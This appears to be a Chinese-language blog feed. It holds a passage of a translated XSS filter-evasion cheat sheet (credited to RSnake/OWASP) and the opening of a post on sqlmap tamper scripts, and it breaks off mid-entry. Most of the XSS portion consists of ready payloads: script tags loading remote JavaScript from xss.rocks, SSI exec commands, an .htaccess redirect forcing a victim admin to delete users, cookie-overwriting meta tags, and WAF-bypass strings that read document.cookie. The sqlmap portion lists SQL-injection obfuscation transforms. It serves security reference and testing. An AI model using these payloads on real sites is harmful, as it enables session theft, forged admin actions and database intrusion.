allowscriptaccess="always">   <h2 id="使用ActionScript来混淆你的XSS-payload"><a href="#使用ActionScript来混淆你的XSS-payload" class="headerlink" title="使用ActionScript来混淆你的XSS payload"></a>使用ActionScript来混淆你的XSS payload</h2><p>   a=”get”;   b=”URL(\””;   c=”javascript:”;   d=”alert(‘XSS’);\”)”;   eval(a+b+c+d);   </p><h2 id="利用XML数据与CDATA区段混淆进行XSS"><a href="#利用XML数据与CDATA区段混淆进行XSS" class="headerlink" title="利用XML数据与CDATA区段混淆进行XSS"></a>利用XML数据与CDATA区段混淆进行XSS</h2><p>这个XSS payload仅限于IE和Netscape8.1中的IE渲染引擎中工作(由于Sec Consult在对yahoo进行审计时候发现这个payload)</p><p>   <xml id="xss"><i><b><img src="javas<!--   -->cript:alert('XSS')"></b></i></xml>   <span datasrc="#xss" datafld="B" dataformatas="HTML"></span>   </p><h2 id="利用XML的embedded方法在本地XML中嵌入Javascript"><a href="#利用XML的embedded方法在本地XML中嵌入Javascript" class="headerlink" title="利用XML的embedded方法在本地XML中嵌入Javascript"></a>利用XML的embedded方法在本地XML中嵌入Javascript</h2><p>这与上述相同,在本地托管(必须在同一台服务器上)包含你的XSS payload的XML文件.具体看示例;</p><p>   <xml src="xsstest.xml" id="I"></xml>   <span datasrc="#I" datafld="C" dataformatas="HTML"></span>   </p><h2 id="利用XML中加入HTML-Time元素完成XSS"><a href="#利用XML中加入HTML-Time元素完成XSS" class="headerlink" title="利用XML中加入HTML+Time元素完成XSS"></a>利用XML中加入HTML+Time元素完成XSS</h2><p>这就是Grey Magic攻击hotmail和yahoo!的方法,这仅限于IE和Netscape8.1中使用,并记住,需要在HTML和<body>标签之间使用;</body></p>   <html><body>   &lt;?xml:namespace prefix=”t”   ns=”urn:schemas-microsoft-com:time”&gt;   &lt;?import namespace=”t”   implementation=”#default#time2”&gt;   &lt;t:set attributeName=”innerHTML”   to=”XSS<script defer>alert(“XSS”)</script>“&gt;   </body></html>   <h2 id="通过简单修改字符去绕过过滤器对”-js”的过滤"><a href="#通过简单修改字符去绕过过滤器对”-js”的过滤" class="headerlink" title="通过简单修改字符去绕过过滤器对”.js”的过滤"></a>通过简单修改字符去绕过过滤器对”.js”的过滤</h2><p>可以将XSS payload的Javascript文件重命名为图片文件命名规则.</p>   <script src="http://xss.rocks/xss.jpg"></script>   <h2 id="SSI-服务端包含-进行XSS"><a href="#SSI-服务端包含-进行XSS" class="headerlink" title="SSI(服务端包含)进行XSS"></a>SSI(服务端包含)进行XSS</h2><p>这需要在服务器上安装SSI,这样才能使用这个XSS payload.可能不需要提及这一种攻击方法,如果攻击者可以在服务器上执行命令,那么这个安全问题就更严重了.</p>   <!--#exec cmd="/bin/echo   '<SCR'"--><!--#exec cmd="/bin/echo 'IPT   SRC=http://xss.rocks/xss.js></SCRIPT>'"-->   <h2 id="利用PHP完成XSS"><a href="#利用PHP完成XSS" class="headerlink" title="利用PHP完成XSS"></a>利用PHP完成XSS</h2><p>需要在服务器上安装php才能使用XSS payload.再次提醒下,如果你可以像这样远程运行任意脚本,那么可能有更多可怕的安全问题;</p><p>   &lt;? echo(‘&lt;SCR)’;   echo(‘IPT&gt;alert(“XSS”)‘);   ?&gt;   </p><h2 id="利用IMG标签嵌入命令执行XSS"><a href="#利用IMG标签嵌入命令执行XSS" class="headerlink" title="利用IMG标签嵌入命令执行XSS"></a>利用IMG标签嵌入命令执行XSS</h2><p>它是需要用户认证后才可以执行命令的当前域页面。它将可以用于创建或者删除用户（如果访问者是管理员），或是在其他地方发送凭证等等，虽然较少被使用,但非常有效的。</p><p>译者注:可以理解为类似CSRF那种操作.</p>   <img src="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">   <h3 id="利用IMG标签嵌入命令执行XSS-part-II"><a href="#利用IMG标签嵌入命令执行XSS-part-II" class="headerlink" title="利用IMG标签嵌入命令执行XSS part II"></a>利用IMG标签嵌入命令执行XSS part II</h3><p>这是一种更加可怕地攻击,因为没有看起来可以区别的标示符,而且它也不用放在被攻击者网站上.攻击向量使用302或304来跳转图片到一个命令地址.一个正常的<img src="httx://badguy.com/a.jpg">能够成为一个攻击工具,来执行相应的攻击命令.下面一个在Apache上的用来进行攻击的.htaccess文件的内容(感谢Timo提供)::</p><p>   Redirect 302 /a.jpg   <a href="http://victimsite.com/admin.asp&amp;deleteuser" target="_blank" rel="noopener">http://victimsite.com/admin.asp&amp;deleteuser</a>   </p><h2 id="Cookie篡改"><a href="#Cookie篡改" class="headerlink" title="Cookie篡改"></a>Cookie篡改</h2><p>我承认这是一种很隐蔽的攻击方式,但我曾经见过一些示例:页面允许<meta>标签,你可以用它来覆盖cookie.还有一些其他的示例:页面不是从数据库中取用户名,而是从cookie中读取.这两个场景相结合的情况下,你可以修改受害者的cookie,让你的XSS payload可以在页面上执行(同样你可以用它来改变用户状态，让它们以你的身份登录等):</p>   <meta http-equiv="Set-Cookie" content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">   <h2 id="利用UTF-7编码进行XSS"><a href="#利用UTF-7编码进行XSS" class="headerlink" title="利用UTF-7编码进行XSS"></a>利用UTF-7编码进行XSS</h2><p>如果页面存在XSS并且没有提供页面编码或者浏览器设置为UTF-7编码,页面就能遭到这种攻击（感谢Roman Ivanov）.在现代浏览器中,除非修改编码类型,否则这种攻击是不会产生的(Watchfire在google的404脚本中发现了这个漏洞)</p><p>   <head><meta name="generator" content="Hexo 3.8.0"><meta http-equiv="CONTENT-TYPE" content="text/html;   charset=UTF-7">   </head>+ADw-SCRIPT+AD4-alert(‘XSS’);+ADw-/SCRIPT+AD4-   </p><h2 id="使用HTML引用封装进行XSS"><a href="#使用HTML引用封装进行XSS" class="headerlink" title="使用HTML引用封装进行XSS"></a>使用HTML引用封装进行XSS</h2><p>这个在IE测试过,视情况而定.对于允许”<script>”标签,但不允许通过”&lt;SCRIPT SRC…”(正则表达式为:”/&lt;script[^&gt;]+src/I”),这种情况就可以考虑下此payload;</p>   <SCRIPT a=">"   SRC="httx://xss.rocks/xss.js"></script>   </p><p>对于允许”<script>”标签,但不允许”<script src …>”站点上执行XSS payload正则表达式为</p><p>” /&lt;script((\s+\w+(\s<em>=\s</em>(?:”(.)<em>?”|’(.)</em>?’|[^’”&gt;\s]+))?)+\s<em>|\s</em>)src/i”,(这个很重要,因为这种正则匹配很常见.)</p>   <SCRIPT =">" SRC="httx://xss.rocks/xss.js"></script>   </p><p>另外一个绕过类似这种正则过滤绕过,XSS payload.</p><p>(” /&lt;script((\s+\w+(\s<em>=\s</em>(?:”(.)<em>?”|’(.)</em>?’|[^’”&gt;\s]+))?)+\s<em>|\s</em>)src/i”)</p>   <script a=">" '' src="httx://xss.rocks/xss.js"></script>   <p>最后一种绕过这种正则过滤,XSS payload,使用重音符(它无法在firefox下使用).正则表达式为:</p><p>“/&lt;script((\s+\w+(\s<em>=\s</em>(?:”(.)<em>?”|’(.)</em>?’|[^’”&gt;\s]+))?)+\s<em>|\s</em>)src/i”;</p>   <script a="`">`   SRC=”httx://xss.rocks/xss.js”&gt;</script>   <p>这个XSS paylodad,会引起正则表达式不会匹配引号,同时发现会引起不正确的终止字符串.</p>   <script a=">'>" src="httx://xss.rocks/xss.js"></script>   <h3 id="一个令人担忧的XSS-payload"><a href="#一个令人担忧的XSS-payload" class="headerlink" title="一个令人担忧的XSS payload"></a>一个令人担忧的XSS payload</h3><p><strong>这种XSS payload让我很担忧,因为它几乎无法防御,除非禁用所有动态内容.</strong></p>   <script>document.write(“&lt;SCRI”);</script>PT   SRC=”httx://xss.rocks/xss.js”&gt;   <h2 id="URL字符串绕过"><a href="#URL字符串绕过" class="headerlink" title="URL字符串绕过"></a>URL字符串绕过</h2><p>假定页面不允许出现<a href="http://www.google.com/" target="_blank" rel="noopener">http://www.google.com/</a>;</p><h3 id="利用IP代替域名"><a href="#利用IP代替域名" class="headerlink" title="利用IP代替域名"></a>利用IP代替域名</h3>   <a href="http://66.102.7.147/" target="_blank" rel="noopener">XSS</a>   <h3 id="利用URL编码"><a href="#利用URL编码" class="headerlink" title="利用URL编码"></a>利用URL编码</h3>   <a href="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D" target="_blank" rel="noopener">XSS</a>   <h3 id="利用双字节编码"><a href="#利用双字节编码" class="headerlink" title="利用双字节编码"></a>利用双字节编码</h3><p>(注意:还有其他双字节编码方式,具体可以通过后面的IP混淆计算器来获取更多信息)</p>   <a href="http://1113982867/" target="_blank" rel="noopener">XSS</a>   <h3 id="利用十六进制编码"><a href="#利用十六进制编码" class="headerlink" title="利用十六进制编码"></a>利用十六进制编码</h3><p>你可以在第2个数字看出来,每个数字允许的总大小在240之内.16进制的值是介于0~F之间的.从第3个数字看,前导0的也是不需要的:</p>   <a href="http://0x42.0x0000066.0x7.0x93/" target="_blank" rel="noopener">XSS</a>   <h3 id="利用八进制编码"><a href="#利用八进制编码" class="headerlink" title="利用八进制编码"></a>利用八进制编码</h3><p>你可以填充0,但是要保证每个“数字”都不小于4个字符:</p>   <a href="http://0102.0146.0007.00000223/" target="_blank" rel="noopener">XSS</a>   <h3 id="利用混合编码"><a href="#利用混合编码" class="headerlink" title="利用混合编码"></a>利用混合编码</h3><p>我们混合并匹配基本编码,添加一些制表符和换行符.这些符号需要包含在引号内才起作用.</p>   <a href="h   tt     p://6       6.000146.0x7.147/">XSS</a>   <h3 id="利用协议解析绕过"><a href="#利用协议解析绕过" class="headerlink" title="利用协议解析绕过"></a>利用协议解析绕过</h3><p>(//转换为http://能节省一些字符).当空间成为问题时,这是非常方便的方法.也能绕过类似于”(ht|f)tp(s)?://“的正则(感谢Ozh的提供).你可以将”//“改为”\”.你需要保证斜杠在准确的位置,否则有可能被当成一个相对路径.</p>   <a href="//www.google.com/">XSS</a>   <h3 id="利用Google”手气不错”-part-1"><a href="#利用Google”手气不错”-part-1" class="headerlink" title="利用Google”手气不错” part 1"></a>利用Google”手气不错” part 1</h3><p>Firefox使用Google的手气不错功能来根据用户键入的关键字跳转到对应的网站.如果你的攻击页面在一些随机关键词的顶部,你可以使用这个特性来攻击Firefox用户.这利用了Firefox的“keyword:”协议.你可以通过使用若干关键词来达到目的:”keyword:XSS+RSnake”,这在Firefox2.0版本不再有效.</p>   <a href="//google">XSS</a>   <h3 id="利用Google”手气不错”-part-2"><a href="#利用Google”手气不错”-part-2" class="headerlink" title="利用Google”手气不错” part 2"></a>利用Google”手气不错” part 2</h3><p>这里使用了一个只有Firefox支持的小窍门.因为它是基于手气不错功能开发的.这个不支持opera，因为opera认为这是一个利用HTTP基本认证的网络钓鱼攻击.事实上它仅仅是一个畸形的URL.如果你单击这个链接的话,它就会产生作用.不过这个特性在Firefox2.0之后的版本也不支持了:</p>   <a href="http://ha.ckers.org@google" target="_blank" rel="noopener">XSS</a>   <h3 id="利用Google”手气不错”-part-3"><a href="#利用Google”手气不错”-part-3" class="headerlink" title="利用Google”手气不错” part 3"></a>利用Google”手气不错” part 3</h3><p>这是一个畸形的Url,只能在Firefox和Opera中起作用.因为它们是基于手气不错功能实现的, 像上面的例子一样,它们需要你的网站在谷歌搜索中排名第一(例如google):</p>   <a href="http://google:ha.ckers.org" target="_blank" rel="noopener">XSS</a>   <h3 id="利用删除cnames"><a href="#利用删除cnames" class="headerlink" title="利用删除cnames"></a>利用删除cnames</h3><p>结合上面的URL，移除www能节省4个字节：</p>   <a href="http://google.com/" target="_blank" rel="noopener">XSS</a>   <h3 id="利用额外点绕过"><a href="#利用额外点绕过" class="headerlink" title="利用额外点绕过"></a>利用额外点绕过</h3>   <a href="http://www.google.com./" target="_blank" rel="noopener">XSS</a>   <h3 id="利用Javascript链接地址"><a href="#利用Javascript链接地址" class="headerlink" title="利用Javascript链接地址"></a>利用Javascript链接地址</h3>   <a href="javascript:document.location='http://www.google.com/'" target="_blank" rel="noopener">XSS</a>   <h3 id="利用内容替换的payload"><a href="#利用内容替换的payload" class="headerlink" title="利用内容替换的payload"></a>利用内容替换的payload</h3><p>假定”<a href="http://www.google.com/“被过滤器以编程方式被替换为空.我会使用类似的攻击向量借用过滤器的转换来绕过XSS过滤器从而创建攻击向量.下面是一个帮助创建攻击向量的例子" target="_blank" rel="noopener">http://www.google.com/“被过滤器以编程方式被替换为空.我会使用类似的攻击向量借用过滤器的转换来绕过XSS过滤器从而创建攻击向量.下面是一个帮助创建攻击向量的例子</a>(IE: “java&#x09;script:”被转换为”java script:”,这在IE、安全模式下的Netscape 8.1+和Opera是有效的);</p>   <a href="http://www.gohttp://www.google.com/ogle.com/" target="_blank" rel="noopener">XSS</a>   <h2 id="字符转义表"><a href="#字符转义表" class="headerlink" title="字符转义表"></a>字符转义表</h2><p>下面是&lt;字符在HTML和Javascript中所有组合.大多数不会被浏览器直接执行.但是在很多能够在上述某些特定情况下使用.</p><p>   &lt;    %3C   &amp;lt   &lt;   &amp;LT   &LT;   &amp;#60   &amp;#060   &amp;#0060   &amp;#00060   &amp;#000060   &amp;#0000060   &#60;   &#060;   &#0060;   &#00060;   &#000060;   &#0000060;   &amp;#x3c   &amp;#x03c   &amp;#x003c   &amp;#x0003c   &amp;#x00003c   &amp;#x000003c   &#x3c;   &#x03c;   &#x003c;   &#x0003c;   &#x00003c;   &#x000003c;   &amp;#X3c   &amp;#X03c   &amp;#X003c   &amp;#X0003c   &amp;#X00003c   &amp;#X000003c   &#X3c;   &#X03c;   &#X003c;   &#X0003c;   &#X00003c;   &#X000003c;   &amp;#x3C   &amp;#x03C   &amp;#x003C   &amp;#x0003C   &amp;#x00003C   &amp;#x000003C   &#x3C;   &#x03C;   &#x003C;   &#x0003C;   &#x00003C;   &#x000003C;   &amp;#X3C   &amp;#X03C   &amp;#X003C   &amp;#X0003C   &amp;#X00003C   &amp;#X000003C   &#X3C;   &#X03C;   &#X003C;   &#X0003C;   &#X00003C;   &#X000003C;   \x3c   \x3C   \u003c   \u003C   </p><h1 id="针对跨站脚本攻击-绕过WAF的方法"><a href="#针对跨站脚本攻击-绕过WAF的方法" class="headerlink" title="针对跨站脚本攻击-绕过WAF的方法"></a>针对跨站脚本攻击-绕过WAF的方法</h1><p>一般问题</p><p>l  存储型XSS</p><p>如果攻击者绕过过滤器发起XSS攻击,WAF将无法防御攻击</p><p>l  反射型XSS</p><p>   Example: <script> … setTimeout(\”writetitle()\”,$_GET[xss])   … </script>   Exploitation: /?xss=500);   alert(document.cookie);//   </p><p>基于DOM型XSS</p><p>   Example: <script> …   eval($_GET[xss]); … </script>   Exploitation: /?xss=document.cookie   </p><h2 id="XSS请求重定向"><a href="#XSS请求重定向" class="headerlink" title="XSS请求重定向"></a>XSS请求重定向</h2><p>容易受攻击代码:</p><p>   …    header(‘Refresh: 0; URL=’.$_GET[‘param’]);   …   </p><p>l  此请求WAF将会被拦截</p><p>   /?param=javascript:alert(document.cookie)   </p><p>l  利用编码将绕过WAF,并会在某些浏览器中执行XSS paylod.</p><p>   /?param=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=   </p><h2 id="针对XSS-bypass-WAF的字符串"><a href="#针对XSS-bypass-WAF的字符串" class="headerlink" title="针对XSS bypass WAF的字符串"></a>针对XSS bypass WAF的字符串</h2><p>   <img src="x" onerror="javascript: window.onerror = alert; throw XSS">   <video> <source onerror="javascript: alert (XSS)">   <input value="XSS" type="text">   <applet code="javascript:confirm(document.cookie);">   <isindex x="javascript:" onmouseover="alert(XSS)">   “&gt;”&gt;’&gt;<script>alert(String.fromCharCode(88,83,83))</script>   “&gt;<img src="x:x" onerror="alert(XSS)">   “&gt;<iframe src="javascript:alert(XSS)">   <object data="javascript:alert(XSS)">   <isindex type="image" src="1" onerror="alert(XSS)">   <img src="x:alert(alt)" onerror="eval(src)" alt="0">   <img src="x:gif" onerror="window['al\u0065rt'](0)">   &lt;iframe/src=”data:text/html,<svg onload="alert(1)">“&gt;   <meta content="&NewLine; 1   &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>   <svg>&lt;script   xlink:href=data&colon;,window.open(‘<a href="https://www.google.com/&#39;)&gt;" target="_blank" rel="noopener">https://www.google.com/&#39;)&gt;</a>&lt;/script   <meta http-equiv="refresh" content="0;url=javascript:confirm(1)"/>   <iframe src="javascript&colon;alert&lpar;document&period;location&rpar;">   <form><a href="javascript:\u0061lert(1)" target="_blank" rel="noopener">X   &lt;img/<em>%00/src=”worksinchrome&colon;prompt(1)”/%00</em>/onerror=’eval(src)’&gt;   <style>//*{x:expression(alert(/xss/))}//<style></style>      On Mouse Over   &lt;img src=”/“ =_=”   title=”onerror=’prompt(1)’”&gt;   <a aa="" aaa="" aaaa="" aaaaa="" aaaaaa="" aaaaaaa="" aaaaaaaa="" aaaaaaaaa="" aaaaaaaaaa="" href="j&#97v&#97script:&#97lert(1)">ClickMe   <script x=""> alert(1) &lt;/script 1=2   <form><button   formaction=javascript&colon;alert(1)>CLICKME   &lt;input/onmouseover=”javaSCRIPT&colon;confirm&lpar;1&rpar;”   <iframe   src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>   </p><h2 id="利用混淆绕过过滤器"><a href="#利用混淆绕过过滤器" class="headerlink" title="利用混淆绕过过滤器"></a>利用混淆绕过过滤器</h2><p>   (alert)(1)   a=alert,a(1)   [1].find(alert)   top<a href="1">“al”+”ert”</a>   top<a href="1">/al/.source+/ert/.source</a>   al\u0065rt(1)   top<a href="1">‘al\145rt’</a>   top<a href="1">‘al\x65rt’</a>   top<a href="1">8680439..toString(30)</a>   </p><h1 id="作者和主编"><a href="#作者和主编" class="headerlink" title="作者和主编"></a>作者和主编</h1><p>Robert “RSnake” Hansen</p><h1 id="贡献者"><a href="#贡献者" class="headerlink" title="贡献者"></a>贡献者</h1><p>Adam Lange</p><p>Mishra Dhiraj其他备忘录</p><p>就不一样介绍了,详情请访问</p><p><a href="https://www.owasp.org/index.php/OWASP_Cheat_Sheet_Series">https://www.owasp.org/index.php/OWASP_Cheat_Sheet_Series</a></p><hr><p><a href="#_ftnref1">[1]</a> XSS过滤绕过备忘单-<a href="http://cheatsheets.hackdig.com/?4.htm">http://cheatsheets.hackdig.com/?4.htm</a></p><p><a href="#_ftnref3">[3]</a> 不止有TAB,而且空格键也可以,并且可以利用两个空格来代替一个空格进行绕过测试.</p></script></a></a></form></iframe></svg></svg></object></iframe></applet></video></p></div></div></div></div></table></xss></xss></h2></h2></h2></bgsound></center>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;img/xss-dog.jpg&quot; alt=&quot;img&quot;&gt;&lt;/p&gt;
&lt;center&gt;&lt;em&gt;Xss Bypass备忘录&lt;/em&gt;&lt;/center&gt;

&lt;center&gt;技术要发展,免不了风波.&lt;/center&gt;

&lt;center&gt;也许这些攻攻防防会更好的促进技
      
    
    </summary>
    
    
      <category term="xss" scheme="https://wywwzjj.top/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>sqlmap tamper 列表</title>
    <link href="https://wywwzjj.top/2019/03/01/SQLMAP-tamper%E5%88%97%E8%A1%A8/"/>
    <id>https://wywwzjj.top/2019/03/01/SQLMAP-tamper列表/</id>
    <published>2019-03-01T15:43:38.000Z</published>
    <updated>2019-03-03T09:51:27.510Z</updated>
    
    <content type="html"><![CDATA[<ul><li>apostrophemask.py 用UTF-8全角字符替换单引号字符</li></ul><ul><li>apostrophenullencode.py 用非法双字节unicode字符替换单引号字符</li></ul><ul><li>appendnullbyte.py 在payload末尾添加空字符编码</li></ul><ul><li>base64encode.py 对给定的payload全部字符使用Base64编码</li></ul><ul><li>between.py 分别用“NOT BETWEEN 0 AND #”替换大于号“&gt;”，“BETWEEN # AND #”替换等于号“=”</li></ul><ul><li>bluecoat.py 在SQL语句之后用有效的随机空白符替换空格符，随后用“LIKE”替换等于号“=”</li></ul><ul><li>chardoubleencode.py 对给定的payload全部字符使用双重URL编码（不处理已经编码的字符）</li></ul><ul><li>charencode.py 对给定的payload全部字符使用URL编码（不处理已经编码的字符）</li></ul><ul><li>charunicodeencode.py 对给定的payload的非编码字符使用Unicode URL编码（不处理已经编码的字符）</li></ul><ul><li>concat2concatws.py 用“CONCAT_WS(MID(CHAR(0), 0, 0), A, B)”替换像“CONCAT(A, B)”的实例</li></ul><ul><li>equaltolike.py 用“LIKE”运算符替换全部等于号“=”</li></ul><ul><li>greatest.py 用“GREATEST”函数替换大于号“&gt;”</li></ul><ul><li>halfversionedmorekeywords.py 在每个关键字之前添加MySQL注释</li></ul><ul><li>ifnull2ifisnull.py 用“IF(ISNULL(A), B, A)”替换像“IFNULL(A, B)”的实例</li></ul><ul><li>lowercase.py 用小写值替换每个关键字字符</li></ul><ul><li>modsecurityversioned.py 用注释包围完整的查询</li></ul><ul><li>modsecurityzeroversioned.py 用当中带有数字零的注释包围完整的查询</li></ul><ul><li>multiplespaces.py 在SQL关键字周围添加多个空格</li></ul><ul><li>nonrecursivereplacement.py 用representations替换预定义SQL关键字，适用于过滤器</li></ul><ul><li>overlongutf8.py 转换给定的payload当中的所有字符</li></ul><ul><li>percentage.py 在每个字符之前添加一个百分号</li></ul><ul><li>randomcase.py 随机转换每个关键字字符的大小写</li></ul><ul><li>randomcomments.py 向SQL关键字中插入随机注释</li></ul><ul><li>securesphere.py 添加经过特殊构造的字符串</li></ul><ul><li>sp_password.py 向payload末尾添加“sp_password” for automatic obfuscation from DBMS logs</li></ul><ul><li>space2comment.py 用“/**/”替换空格符</li></ul><ul><li>space2dash.py 用破折号注释符“–”其次是一个随机字符串和一个换行符替换空格符</li></ul><ul><li>space2hash.py 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符</li></ul><ul><li>space2morehash.py 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符</li></ul><ul><li>space2mssqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</li></ul><ul><li>space2mssqlhash.py 用磅注释符“#”其次是一个换行符替换空格符</li></ul><ul><li>space2mysqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</li></ul><ul><li>space2mysqldash.py 用破折号注释符“–”其次是一个换行符替换空格符</li></ul><ul><li>space2plus.py 用加号“+”替换空格符</li></ul><ul><li>space2randomblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</li></ul><ul><li>unionalltounion.py 用“UNION SELECT”替换“UNION ALL SELECT”</li></ul><ul><li>unmagicquotes.py 用一个多字节组合%bf%27和末尾通用注释一起替换空格符</li></ul><ul><li>varnish.py 添加一个HTTP头“X-originating-IP”来绕过WAF</li></ul><ul><li>versionedkeywords.py 用MySQL注释包围每个非函数关键字</li></ul><ul><li>versionedmorekeywords.py 用MySQL注释包围每个关键字</li></ul><ul><li>xforwardedfor.py 添加一个伪造的HTTP头“X-Forwarded-For”来绕过WAF</li></ul><p>下面针对 sqlmap 自带的 tamper 做一下简单的解释。</p><h4 id="apostrophemask-py"><a href="#apostrophemask-py" class="headerlink" title="apostrophemask.py:"></a>apostrophemask.py:</h4><blockquote><p>return payload.replace(‘’’, “%EF%BC%87”) if payload else payload</p></blockquote><p>将单引号 url 编码，用于过滤了单引号的情况。</p><blockquote><p>1’ AND ‘1’=’1 <strong>to</strong> 1%EF%BC%87 AND %EF%BC%871%EF%BC%87=%EF%BC%871</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="apostrophenullencode-py"><a href="#apostrophenullencode-py" class="headerlink" title="apostrophenullencode.py:"></a>apostrophenullencode.py:</h4><blockquote><p>return payload.replace(‘’’, “%00%27”) if payload else payload</p></blockquote><p>将单引号替换为宽字节 unicode 字符，用于过滤了单引号的情况</p><blockquote><p>1’ AND ‘1’=’1 <strong>to</strong> 1�’ AND �’1�’=�’1</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="appendnullbyte-py"><a href="#appendnullbyte-py" class="headerlink" title="appendnullbyte.py:"></a>appendnullbyte.py:</h4><blockquote><p>return “%s%%00” % payload if payload else payload</p></blockquote><p>在你构造的payload后面加一个空字符</p><blockquote><p>1’ AND ‘1’=’1 <strong>to</strong> 1’ AND ‘1’=’1[]</p></blockquote><p><strong>适用数据库：</strong>Access</p><h4 id="base64encode-py"><a href="#base64encode-py" class="headerlink" title="base64encode.py:"></a>base64encode.py:</h4><blockquote><p>return base64.b64encode(payload.encode(UNICODE_ENCODING)) if payload else payload</p></blockquote><p>这个看模块名也知道是 base64 编码</p><blockquote><p>1’ AND ‘1’=’1 <strong>to</strong> MScgQU5EICcxJz0nMQ==</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="between-py"><a href="#between-py" class="headerlink" title="between.py:"></a>between.py:</h4><p>这个代码有点长，就不贴代码了，可以自己去查看：</p><p><code>\SQLMap\tamper\between.py</code></p><p>将大于符号和等号用 between 语句替换，用于过滤了大于符号和等号的情况</p><blockquote><p>1 AND A &gt; B <strong>to</strong> 1 AND A NOT BETWEEN 0 AND B</p><p>1 AND A = B <strong>to</strong> 1 AND A BETWEEN B AND B</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="bluecoat-py"><a href="#bluecoat-py" class="headerlink" title="bluecoat.py:"></a>bluecoat.py:</h4><p>用随机的空白字符代替空格，并且将等号替换为 like ，用于过滤了空格和等号的情况</p><blockquote><p>union select <em>from users where id = 1 <strong>to</strong> union%09select</em> from%09users where id like 1</p></blockquote><p><strong>适用数据库：</strong>MySQL 5.1, SGOS</p><h4 id="chardoubleencode-py"><a href="#chardoubleencode-py" class="headerlink" title="chardoubleencode.py:"></a>chardoubleencode.py:</h4><p>用 url 编码两次你的 payload</p><blockquote><p>select * from users <strong>to</strong>%2573%2565%256c%2565%2563%2574%2520%252a%2520%2566%2572%256f%256d%2520%2575%2573%2565%2572</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="charencode-py"><a href="#charencode-py" class="headerlink" title="charencode.py:"></a>charencode.py:</h4><p>用 url 编码一次你的 payload</p><blockquote><p>select * from users <strong>to</strong>%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%75%73%65%72</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="charunicodeencode-py："><a href="#charunicodeencode-py：" class="headerlink" title="charunicodeencode.py："></a>charunicodeencode.py：</h4><p>用 unicode 编码 payload ，只编码非编码字符</p><blockquote><p>select * from users <strong>to</strong>u0073u0065u006cu0065u0063u0074u0020u002au0020u0066u0072u006fu006du0020u0075u0073u0065u0072u0073</p></blockquote><p><strong>适用数据库：</strong>ALL，但是需要 asp 和 asp.net 环境</p><h4 id="commalesslimit-py："><a href="#commalesslimit-py：" class="headerlink" title="commalesslimit.py："></a>commalesslimit.py：</h4><p>将 payload 中的逗号用 offset 代替，用于过滤了逗号并且是两个参数的情况</p><blockquote><p>limit 2,1 <strong>to</strong> limit 1 offset 2</p></blockquote><p><strong>适用数据库：</strong>MySQL</p><h4 id="commalessmid-py："><a href="#commalessmid-py：" class="headerlink" title="commalessmid.py："></a>commalessmid.py：</h4><p>将 payload 中的逗号用 from for 代替，用于过滤了逗号并且是三参数的情况</p><blockquote><p>mid(version(), 1, 1) <strong>to</strong> mid(version() from 1 for 1)</p></blockquote><p><strong>适用数据库：</strong>MySQL</p><h4 id="commentbeforeparentheses-py："><a href="#commentbeforeparentheses-py：" class="headerlink" title="commentbeforeparentheses.py："></a>commentbeforeparentheses.py：</h4><blockquote><p>retVal = re.sub(r”b(w+)(“, “g<1>/**/(“, retVal)</1></p></blockquote><p>在某个单词后的第一个括号前面加入 /**/ ，用于过滤了函数的情况</p><blockquote><p>union select group_concat(table_name) <strong>to</strong> union select group_concat/**/(table_name)</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="concat2concatws-py："><a href="#concat2concatws-py：" class="headerlink" title="concat2concatws.py："></a>concat2concatws.py：</h4><blockquote><p>payload = payload.replace(“CONCAT(“, “CONCAT_WS(MID(CHAR(0),0,0),”)</p></blockquote><p>用于过滤了 concat 函数的情况</p><blockquote><p>concat(1,2) <strong>to</strong> concat_ws(mid(char(0), 0, 0), 1, 2)</p></blockquote><p><strong>适用数据库：</strong>MySQL</p><h4 id="equaltolike-py："><a href="#equaltolike-py：" class="headerlink" title="equaltolike.py："></a>equaltolike.py：</h4><blockquote><p>retVal = re.sub(r”s<em>=s</em>“, “ LIKE “, retVal)</p></blockquote><p>将等号用 like 代替，用于过滤了等号的情况</p><blockquote><p>select <em>from users where id=1 <strong>to</strong> select</em> from users where id like 1</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="escapequotes-py："><a href="#escapequotes-py：" class="headerlink" title="escapequotes.py："></a>escapequotes.py：</h4><blockquote><p>return payload.replace(“‘“, “‘“).replace(‘“‘, ‘“‘)</p></blockquote><p>将单引号转换成 \’ ，双引号转换成 \” ，用于过滤了单引号或双引号的情况</p><blockquote><p>1’ and 1=1–+ <strong>to</strong> 1\’ and 1=1–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="greatest-py："><a href="#greatest-py：" class="headerlink" title="greatest.py："></a>greatest.py：</h4><p>用 greatest 代替大于符号，用于大于符号被过滤了的情况</p><blockquote><p>1 and a&gt;b <strong>to</strong> 1 and greatest(a,b+1)=a</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="halfversionedmorekeywords-py："><a href="#halfversionedmorekeywords-py：" class="headerlink" title="halfversionedmorekeywords.py："></a>halfversionedmorekeywords.py：</h4><p>在关键字前添加注释，用于过滤了关键字的情况</p><blockquote><p>union select 1,2 <strong>to</strong> /<em>!0union/</em>!0select 1,2</p></blockquote><p><strong>适用数据库：</strong>MySQL &lt; 5.1</p><h4 id="htmlencode-py："><a href="#htmlencode-py：" class="headerlink" 